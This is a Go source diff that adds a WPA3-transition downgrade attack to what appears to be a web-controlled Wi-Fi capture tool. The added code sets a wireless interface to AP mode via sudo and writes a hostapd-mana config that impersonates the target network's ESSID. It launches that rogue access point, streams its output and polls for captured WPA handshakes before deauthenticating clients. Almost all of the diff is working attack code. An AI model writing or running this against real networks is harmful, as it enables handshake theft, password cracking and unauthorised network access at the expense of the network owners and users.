@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"io"
 	"net/http"
@@ -638,6 +639,31 @@ type CaptureTarget struct {
 	ClientMACs []string `json:"client_macs"` // known connected stations
 }
 
+// prepareRogueIface tears the interface down, sets it to AP mode, and brings it back up
+// so hostapd-mana can claim it without nl80211 driver errors.
+func prepareRogueIface(userID int, iface string) error {
+	// Unmanage from NetworkManager so it stops fighting us
+	sudoRun(userID, "nmcli", "device", "set", iface, "managed", "no")
+	// Cycle the interface and set AP mode
+	sudoRun(userID, "ip", "link", "set", iface, "down")
+	sudoRun(userID, "iw", iface, "set", "type", "__ap")
+	_, err := sudoRun(userID, "ip", "link", "set", iface, "up")
+	return err
+}
+
+func generateHostapdManaConfig(iface, essid string, channel int, bssidTag string) (confPath, capPath string, err error) {
+	hwMode := "g"
+	if channel >= 34 {
+		hwMode = "a"
+	}
+	capPath = fmt.Sprintf("/tmp/mana-%s.hccapx", bssidTag)
+	confPath = fmt.Sprintf("/tmp/mana-%s.conf", bssidTag)
+	conf := fmt.Sprintf("interface=%s\ndriver=nl80211\nhw_mode=%s\nchannel=%d\nssid=%s\nauth_algs=3\nwpa=2\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\nwpa_passphrase=Mana1234!\nenable_mana=1\nmana_wpaout=%s\n",
+		iface, hwMode, channel, essid, capPath)
+	err = os.WriteFile(confPath, []byte(conf), 0600)
+	return
+}
+
 func handleStartWifiCapture(db *DB) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
@@ -655,10 +681,12 @@ func handleStartWifiCapture(db *DB) http.HandlerFunc {
 		}
 		userID := claims.UserID
 		var req struct {
-			MonitorIface string          `json:"monitor_iface"`
-			Targets      []CaptureTarget `json:"targets"`
-			DeauthCount  int             `json:"deauth_count"`
-			DeauthRepeat bool            `json:"deauth_repeat"` // keep re-sending deauths every 10s
+			MonitorIface  string          `json:"monitor_iface"`
+			Targets       []CaptureTarget `json:"targets"`
+			DeauthCount   int             `json:"deauth_count"`
+			DeauthRepeat  bool            `json:"deauth_repeat"`
+			WPA3Downgrade bool            `json:"wpa3_downgrade"`
+			RogueIface    string          `json:"rogue_iface"`
 		}
 		parseJSON(r, &req)
 		if req.MonitorIface == "" || len(req.Targets) == 0 {
@@ -682,6 +710,90 @@ func handleStartWifiCapture(db *DB) http.HandlerFunc {
 				// Clean up all numbered variants so airodump-ng always starts at -01.
 				for i := 1; i <= 20; i++ {
 					os.Remove(fmt.Sprintf("%s-%02d.cap", capPrefix, i))
+				}
+
+				bssidTag := strings.ReplaceAll(t.BSSID, ":", "")
+
+				// WPA3-Transition Downgrade: spawn hostapd-mana rogue AP before capture.
+				if req.WPA3Downgrade && req.RogueIface != "" {
+					manaPath, lookErr := exec.LookPath("hostapd-mana")
+					if lookErr != nil {
+						job.mu.Lock()
+						job.output = append(job.output,
+							"[!] WPA3-Downgrade aborted: hostapd-mana not found — install with: sudo apt install hostapd-mana",
+						)
+						job.mu.Unlock()
+						continue
+					}
+					confPath, capPath, cfgErr := generateHostapdManaConfig(req.RogueIface, t.ESSID, t.Channel, bssidTag)
+					if cfgErr != nil {
+						job.mu.Lock()
+						job.output = append(job.output, fmt.Sprintf("[!] WPA3-Downgrade aborted: failed to write hostapd-mana config: %v", cfgErr))
+						job.mu.Unlock()
+						continue
+					}
+					job.mu.Lock()
+					job.output = append(job.output, fmt.Sprintf("[*] WPA3-Downgrade: preparing %s for AP mode", req.RogueIface))
+					job.mu.Unlock()
+					if prepErr := prepareRogueIface(userID, req.RogueIface); prepErr != nil {
+						job.mu.Lock()
+						job.output = append(job.output, fmt.Sprintf("[!] WPA3-Downgrade aborted: could not prepare %s: %v", req.RogueIface, prepErr))
+						job.mu.Unlock()
+						continue
+					}
+					manaCmd, manaCmdErr := sudoCmd(userID, manaPath, confPath)
+					if manaCmdErr != nil {
+						job.mu.Lock()
+						job.output = append(job.output, fmt.Sprintf("[!] WPA3-Downgrade aborted: sudo not available: %v", manaCmdErr))
+						job.mu.Unlock()
+						continue
+					}
+					manaStdout, _ := manaCmd.StdoutPipe()
+					manaStderr, _ := manaCmd.StderrPipe()
+					if err := manaCmd.Start(); err != nil {
+						job.mu.Lock()
+						job.output = append(job.output, fmt.Sprintf("[!] WPA3-Downgrade aborted: failed to start hostapd-mana: %v", err))
+						job.mu.Unlock()
+						continue
+					}
+					job.mu.Lock()
+					job.cmds = append(job.cmds, manaCmd)
+					job.output = append(job.output,
+						fmt.Sprintf("[*] WPA3-Downgrade: rogue AP '%s' on %s ch %d", t.ESSID, req.RogueIface, t.Channel),
+					)
+					job.mu.Unlock()
+					// Stream hostapd-mana output
+					streamMana := func(rc io.ReadCloser) {
+						scanner := bufio.NewScanner(rc)
+						for scanner.Scan() {
+							line := "[mana] " + scanner.Text()
+							job.mu.Lock()
+							job.output = append(job.output, line)
+							job.mu.Unlock()
+						}
+					}
+					go streamMana(manaStdout)
+					go streamMana(manaStderr)
+					// Poll mana_wpaout for backup handshake confirmation
+					go func(cp string) {
+						for {
+							time.Sleep(5 * time.Second)
+							job.mu.Lock()
+							done := job.done
+							job.mu.Unlock()
+							if done {
+								return
+							}
+							if info, statErr := os.Stat(cp); statErr == nil && info.Size() > 0 {
+								job.mu.Lock()
+								job.output = append(job.output, fmt.Sprintf("[+] hostapd-mana captured handshake → %s", cp))
+								job.mu.Unlock()
+								return
+							}
+						}
+					}(capPath)
+					// Let rogue AP start broadcasting before we deauth clients
+					time.Sleep(3 * time.Second)
 				}
 
 				// airodump-ng capture for this BSSID on its channel.
